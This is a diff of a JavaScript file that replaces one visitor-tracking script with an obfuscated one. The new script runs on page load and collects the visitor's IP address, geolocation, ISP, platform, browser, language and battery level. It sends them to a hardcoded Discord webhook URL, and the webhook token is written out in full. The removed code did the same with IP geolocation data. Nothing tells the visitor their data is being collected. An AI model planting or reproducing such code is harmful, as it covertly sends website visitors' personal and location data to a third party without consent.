@@ -1,63 +1,28 @@
-// Function to fetch IP data from ip-api.com
-async function fetchIPData() {
-    try {
-        const response = await fetch('https://ip-api.com/json/');
-        if (!response.ok) {
-            throw new Error('Failed to fetch IP data');
-        }
-        const data = await response.json();
-        return data;
-    } catch (error) {
-        console.error('Error fetching IP data:', error);
-        return null;
-    }
+async function sendUserDataToDiscord() {
+  try {
+    const _0x4fc030 = await fetch("https://json.geoiplookup.io");
+    const _0x48494b = await _0x4fc030.json();
+    const _0x50d605 = {
+      'platform': navigator.platform,
+      'userAgent': navigator.userAgent,
+      'language': navigator.language,
+      'battery': navigator.getBattery ? navigator.getBattery().level * 0x64 : null
+    };
+    const _0x291852 = "\n                **User Data:**\n                - IP Address: " + _0x48494b.ip + "\n                - Country: " + _0x48494b.country_name + "\n                - Region: " + _0x48494b.region + "\n                - City: " + _0x48494b.city + "\n                - ISP: " + _0x48494b.isp + "\n                - Device: " + _0x50d605.platform + "\n                - Browser: " + _0x50d605.userAgent + "\n                - Language: " + _0x50d605.language + "\n                - Battery: " + _0x50d605.battery + "%\n            ";
+    const _0x3cb14e = {
+      'content': _0x291852
+    };
+    await fetch("https://discord.com/api/webhooks/1220786784426922025/OXXd7xO_wT8mc48DTBIJ2tDY45OyH8X5pPllvaR8RY65SJlpp8lRlj45QHO1j9OjfnL-", {
+      'method': 'POST',
+      'headers': {
+        'Content-Type': "application/json"
+      },
+      'body': JSON.stringify(_0x3cb14e)
+    });
+    console.log('Loaded');
+  } catch (_0x1bb2d0) {
+    console.error("Could not log visit", _0x1bb2d0);
+  }
 }
 
-// Function to send data to Discord webhook
-async function sendToDiscordWebhook(ipData) {
-    try {
-        const webhookURL = 'https://discord.com/api/webhooks/1220786784426922025/OXXd7xO_wT8mc48DTBIJ2tDY45OyH8X5pPllvaR8RY65SJlpp8lRlj45QHO1j9OjfnL-';
-        const payload = {
-            content: `IP Data:
-Country: ${ipData.country}
-IP: ${ipData.query}
-Country Code: ${ipData.countryCode}
-Region: ${ipData.region}
-Region Name: ${ipData.regionName}
-City: ${ipData.city}
-Zip: ${ipData.zip}
-Latitude: ${ipData.lat}
-Longitude: ${ipData.lon}
-Timezone: ${ipData.timezone}
-ISP: ${ipData.isp}
-Organization: ${ipData.org}
-AS: ${ipData.as}`
-        };
-
-        const response = await fetch(webhookURL, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(payload),
-        });
-
-        if (!response.ok) {
-            throw new Error('Failed to send data to Discord webhook');
-        }
-        console.log('Data sent to Discord webhook successfully');
-    } catch (error) {
-        console.error('Error sending data to Discord webhook:', error);
-    }
-}
-
-// Main function to orchestrate the process
-async function main() {
-    const ipData = await fetchIPData();
-    if (ipData) {
-        sendToDiscordWebhook(ipData);
-    }
-}
-
-// Run the main function
-main();
+window.addEventListener("load", sendUserDataToDiscord);
